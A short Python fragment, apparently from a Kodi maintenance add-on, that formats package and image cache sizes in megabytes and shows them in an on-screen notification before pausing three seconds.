total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1206
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1207
if notify_mode =='true':xbmc .executebuiltin ('XBMC.Notification(%s, %s, %s, %s)'%('Maintenance Status','Packages: '+str (total_sizetext )+' MB' ' - Images: '+str (total_sizetext2 )+' MB','5000',iconpath ))#line:1209
time .sleep (3 )#line:1210
